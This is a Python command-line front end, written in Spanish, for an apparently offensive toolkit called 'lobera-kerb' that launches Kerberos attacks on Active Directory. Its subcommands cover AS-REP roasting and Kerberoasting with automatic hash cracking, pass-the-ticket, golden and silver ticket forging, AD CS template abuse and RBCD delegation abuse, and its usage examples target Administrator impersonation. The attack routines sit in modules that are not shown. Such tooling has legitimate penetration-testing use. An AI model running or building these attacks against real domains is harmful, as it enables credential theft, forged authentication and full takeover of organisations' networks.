#!/usr/bin/env python3
# tools/kerb/main.py
"""
lobera-kerb — Ataques y técnicas Kerberos contra Active Directory.

Subcomandos:
  asrep      AS-REP Roasting — captura hashes de cuentas sin preauth (no necesita creds)
  kerbroast  Kerberoasting — captura TGS de cuentas con SPN (necesita una cuenta válida)
  ptt        Pass-the-Ticket — usar un ticket .ccache/.kirbi existente
  golden     Golden Ticket — TGT forjado con krbtgt hash (persistencia total)
  silver     Silver Ticket — TGS forjado para un servicio concreto
  adcs       Abuso de AD CS (ESC1, ESC2, ESC4) para escalada de privilegios
  rbcd       Resource-Based Constrained Delegation — abuso de delegación

Uso:
  lobera-kerb asrep     -t DC01 -d CORP.LOCAL --userlist users.txt --on-hash-crack rockyou.txt
  lobera-kerb kerbroast -t DC01 -d CORP.LOCAL -u USER -p PASS --on-hash-crack rockyou.txt
  lobera-kerb ptt       -t DC01 -d CORP.LOCAL --ccache admin.ccache
  lobera-kerb golden    -t DC01 -d CORP.LOCAL -u krbtgt -H <NTHASH> --sid S-1-5-21-...
  lobera-kerb silver    -t DC01 -d CORP.LOCAL --spn cifs/DC01 -H <NTHASH> --sid S-1-5-21-...
  lobera-kerb adcs      -t DC01 -d CORP.LOCAL -u USER -p PASS --template 'User' --target-user Administrator
  lobera-kerb rbcd      -t DC01 -d CORP.LOCAL -u USER -p PASS --delegate-from COMPUTERA$ --delegate-to DC01$
"""

import sys
import os
import argparse

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.output import console
from core.session_db import init_db
from core.hooks import add_args_on_hash_crack


# ──────────────────────────────────────────────────────────────────────────────
# Helpers — construir Target y Credentials desde args
# ──────────────────────────────────────────────────────────────────────────────

def _target_creds(args):
    from core.target import Target
    from core.credentials import Credentials

    target = Target(
        ip=args.target,
        domain=getattr(args, 'domain', None),
        timeout=getattr(args, 'timeout', 5),
    )
    nt_hash = getattr(args, 'hash', None)
    creds = Credentials(
        user=getattr(args, 'user', None),
        password=getattr(args, 'password', None),
        nt_hash=nt_hash,
        domain=getattr(args, 'domain', None),
    )
    return target, creds


# ──────────────────────────────────────────────────────────────────────────────
# Subcomandos
# ──────────────────────────────────────────────────────────────────────────────

def cmd_asrep(args):
    """
    AS-REP Roasting: solicita AS-REPs para usuarios sin preauth y
    devuelve hashes crackeables con hashcat -m 18200.
    No necesita credenciales — solo alcanzabilidad al puerto 88.
    """
    from scripts.kerberos.extraction.asrep_roasting import AsrepRoastingScript
    target, creds = _target_creds(args)
    script = AsrepRoastingScript(target=target, creds=creds)
    hashes = script.run(
        userlist=args.userlist,
        output=getattr(args, 'output', None),
    )

    if hashes and getattr(args, 'on_hash_crack', None):
        from core.hooks import on_hash_capturado
        for h in hashes:
            on_hash_capturado(
                hash_str=h,
                formato='krb5asrep',
                wordlist=args.on_hash_crack,
                engine=getattr(args, 'crack_engine', 'auto'),
                rules=getattr(args, 'crack_rules', None),
                target_ip=args.target,
            )


def cmd_kerbroast(args):
    """
    Kerberoasting: solicita TGS para cuentas con SPN registrado y
    devuelve hashes crackeables con hashcat -m 13100.
    Necesita una cuenta de dominio válida.
    """
    from scripts.kerberos.extraction.kerberoasting import Script
    target, creds = _target_creds(args)
    script = Script(target=target, creds=creds)
    hashes = script.run(
        spn=getattr(args, 'spn', None),
        output=getattr(args, 'output', None),
    )

    if hashes and getattr(args, 'on_hash_crack', None):
        from core.hooks import on_hash_capturado
        for h in hashes:
            on_hash_capturado(
                hash_str=h,
                formato='krb5tgs',
                wordlist=args.on_hash_crack,
                engine=getattr(args, 'crack_engine', 'auto'),
                rules=getattr(args, 'crack_rules', None),
                target_ip=args.target,
            )


def cmd_ptt(args):
    """
    Pass-the-Ticket: carga un ticket .ccache o .kirbi en el entorno actual
    para que impacket y otras herramientas lo usen automáticamente.
    """
    from scripts.kerberos.tickets.pass_the_ticket import Script
    target, creds = _target_creds(args)
    script = Script(target=target, creds=creds)
    script.run(
        ccache=getattr(args, 'ccache', None),
        kirbi=getattr(args, 'kirbi', None),
    )


def cmd_golden(args):
    """
    Golden Ticket: forja un TGT usando el hash del krbtgt.
    Requiere: dominio, SID del dominio, hash NT de krbtgt.
    Proporciona persistencia total mientras el hash krbtgt no cambie.
    """
    from scripts.kerberos.tickets.golden_ticket import Script
    target, creds = _target_creds(args)
    script = Script(target=target, creds=creds)
    script.run(
        sid=args.sid,
        target_user=getattr(args, 'target_user', 'Administrator'),
        groups=getattr(args, 'groups', None),
        output=getattr(args, 'output', None),
    )


def cmd_silver(args):
    """
    Silver Ticket: forja un TGS para un servicio concreto.
    Necesita el hash NT de la cuenta de servicio (no del krbtgt).
    Más silencioso que Golden Ticket — no contacta el KDC.
    """
    from scripts.kerberos.tickets.silver_ticket import Script
    target, creds = _target_creds(args)
    script = Script(target=target, creds=creds)
    script.run(
        spn=args.spn,
        sid=args.sid,
        target_user=getattr(args, 'target_user', 'Administrator'),
        output=getattr(args, 'output', None),
    )


def cmd_adcs(args):
    """
    Abuso de AD CS: detecta y explota plantillas de certificado
    mal configuradas (ESC1, ESC2, ESC4) para obtener TGTs de
    cuentas privilegiadas.
    """
    from scripts.kerberos.credentials.adcs import Script
    target, creds = _target_creds(args)
    script = Script(target=target, creds=creds)
    script.run(
        template=getattr(args, 'template', None),
        target_user=getattr(args, 'target_user', 'Administrator'),
        ca=getattr(args, 'ca', None),
        output=getattr(args, 'output', None),
    )


def cmd_rbcd(args):
    """
    Resource-Based Constrained Delegation: configura RBCD para
    delegar la identidad de cualquier usuario a una cuenta controlada,
    permitiendo obtener un TGS como ese usuario (incl. administradores).
    """
    from scripts.kerberos.delegation.rbcd import Script
    target, creds = _target_creds(args)
    script = Script(target=target, creds=creds)
    script.run(
        delegate_from=args.delegate_from,
        delegate_to=args.delegate_to,
    )


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def _flags_comunes(p, requiere_creds=True):
    """Flags que comparten todos los subcomandos."""
    p.add_argument('-t', '--target',   required=True, metavar='IP', help='IP del KDC/DC')
    p.add_argument('-d', '--domain',   required=True, metavar='DOMINIO', help='Dominio Kerberos (ej: CORP.LOCAL)')
    if requiere_creds:
        p.add_argument('-u', '--user',     default='', metavar='USUARIO')
        p.add_argument('-p', '--password', default='', metavar='CONTRASEÑA')
        p.add_argument('-H', '--hash',     default='', metavar='NTHASH',
                       help='Hash NT en lugar de contraseña (LM:NT o solo NT)')
    p.add_argument('--timeout', type=int, default=5, metavar='SEG', help='Timeout (default: 5s)')
    p.add_argument('-o', '--output', default=None, metavar='FICHERO',
                   help='Guardar hashes/tickets en fichero')
    return p


def build_parser():
    parser = argparse.ArgumentParser(
        prog='lobera-kerb',
        description='Ataques Kerberos contra Active Directory',
    )
    subs = parser.add_subparsers(dest='cmd', metavar='subcomando')

    # ── asrep ────────────────────────────────────────────────────────────────
    p_asrep = subs.add_parser('asrep',
        help='AS-REP Roasting — hashes sin necesitar creds')
    _flags_comunes(p_asrep, requiere_creds=False)
    p_asrep.add_argument('--userlist', required=True, metavar='FICHERO',
                          help='Fichero con un usuario por línea')
    add_args_on_hash_crack(p_asrep)

    # ── kerbroast ────────────────────────────────────────────────────────────
    p_kerb = subs.add_parser('kerbroast',
        help='Kerberoasting — TGS de cuentas con SPN')
    _flags_comunes(p_kerb, requiere_creds=True)
    p_kerb.add_argument('--spn', default=None, metavar='SPN',
                         help='SPN concreto (si no, enumera todos los de dominio)')
    add_args_on_hash_crack(p_kerb)

    # ── ptt ──────────────────────────────────────────────────────────────────
    p_ptt = subs.add_parser('ptt',
        help='Pass-the-Ticket — usar ticket .ccache/.kirbi')
    _flags_comunes(p_ptt, requiere_creds=False)
    grupo = p_ptt.add_mutually_exclusive_group(required=True)
    grupo.add_argument('--ccache', metavar='FICHERO', help='Ticket en formato ccache')
    grupo.add_argument('--kirbi',  metavar='FICHERO', help='Ticket en formato kirbi (Mimikatz/Rubeus)')

    # ── golden ───────────────────────────────────────────────────────────────
    p_gold = subs.add_parser('golden',
        help='Golden Ticket — TGT forjado con hash de krbtgt')
    _flags_comunes(p_gold, requiere_creds=True)
    p_gold.add_argument('--sid',         required=True, metavar='SID',
                         help='SID del dominio (S-1-5-21-...)')
    p_gold.add_argument('--target-user', default='Administrator', dest='target_user',
                         metavar='USUARIO', help='Usuario a impersonar (default: Administrator)')
    p_gold.add_argument('--groups',      default=None, metavar='IDS',
                         help='IDs de grupo separados por coma (default: 512,513,518,519,520)')

    # ── silver ───────────────────────────────────────────────────────────────
    p_silv = subs.add_parser('silver',
        help='Silver Ticket — TGS forjado para un servicio')
    _flags_comunes(p_silv, requiere_creds=True)
    p_silv.add_argument('--spn',         required=True, metavar='SPN',
                         help='SPN del servicio (ej: cifs/DC01.corp.local)')
    p_silv.add_argument('--sid',         required=True, metavar='SID',
                         help='SID del dominio (S-1-5-21-...)')
    p_silv.add_argument('--target-user', default='Administrator', dest='target_user',
                         metavar='USUARIO', help='Usuario a impersonar (default: Administrator)')

    # ── adcs ─────────────────────────────────────────────────────────────────
    p_adcs = subs.add_parser('adcs',
        help='Abuso de AD CS — ESC1/ESC2/ESC4')
    _flags_comunes(p_adcs, requiere_creds=True)
    p_adcs.add_argument('--template',    default=None, metavar='NOMBRE',
                         help='Nombre de plantilla a abusar')
    p_adcs.add_argument('--target-user', default='Administrator', dest='target_user',
                         metavar='USUARIO', help='Usuario a suplantar (default: Administrator)')
    p_adcs.add_argument('--ca',          default=None, metavar='CA',
                         help='Nombre de la CA (si no, enumera automáticamente)')

    # ── rbcd ─────────────────────────────────────────────────────────────────
    p_rbcd = subs.add_parser('rbcd',
        help='Resource-Based Constrained Delegation')
    _flags_comunes(p_rbcd, requiere_creds=True)
    p_rbcd.add_argument('--delegate-from', required=True, dest='delegate_from', metavar='CUENTA',
                         help='Cuenta controlada que recibirá la delegación (ej: COMPUTERA$)')
    p_rbcd.add_argument('--delegate-to',   required=True, dest='delegate_to',   metavar='CUENTA',
                         help='Cuenta objetivo sobre la que configurar RBCD (ej: DC01$)')

    return parser


def _banner():
    from tools.common import banner, tabla_modos, ejemplos
    banner("lobera-kerb  —  Ataques Kerberos / Active Directory")
    tabla_modos([
        ("asrep",     "AS-REP Roasting — hashes de cuentas sin preauth (sin creds)"),
        ("kerbroast", "Kerberoasting — TGS de cuentas con SPN (con creds)"),
        ("ptt",       "Pass-the-Ticket — usar ticket .ccache o .kirbi"),
        ("golden",    "Golden Ticket — TGT forjado con hash de krbtgt"),
        ("silver",    "Silver Ticket — TGS forjado para un servicio concreto"),
        ("adcs",      "Abuso de AD CS — ESC1/ESC2/ESC4 para escalar privilegios"),
        ("rbcd",      "Resource-Based Constrained Delegation"),
    ])
    ejemplos([
        "# AS-REP roasting sin credenciales + crackeo automático",
        "lobera-kerb asrep -t 10.10.10.5 -d CORP.LOCAL --userlist users.txt --on-hash-crack rockyou.txt",
        "",
        "# Kerberoasting con credenciales",
        "lobera-kerb kerbroast -t 10.10.10.5 -d CORP.LOCAL -u jdoe -p Pass123 --on-hash-crack rockyou.txt",
        "",
        "# Usar ticket capturado",
        "lobera-kerb ptt -t 10.10.10.5 -d CORP.LOCAL --ccache admin.ccache",
        "",
        "# Golden Ticket (requiere hash krbtgt)",
        "lobera-kerb golden -t 10.10.10.5 -d CORP.LOCAL -u krbtgt -H <NTHASH> --sid S-1-5-21-...",
        "",
        "# Abuso ESC1 en AD CS",
        "lobera-kerb adcs -t 10.10.10.5 -d CORP.LOCAL -u jdoe -p Pass123 --template 'User' --target-user Administrator",
    ])


_CMDS = {
    'asrep':     cmd_asrep,
    'kerbroast': cmd_kerbroast,
    'ptt':       cmd_ptt,
    'golden':    cmd_golden,
    'silver':    cmd_silver,
    'adcs':      cmd_adcs,
    'rbcd':      cmd_rbcd,
}


def main():
    import sys
    init_db()
    if not sys.argv[1:]:
        _banner()
        return
    parser = build_parser()
    args   = parser.parse_args()

    if not args.cmd:
        _banner()
        return

    fn = _CMDS.get(args.cmd)
    if fn:
        fn(args)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
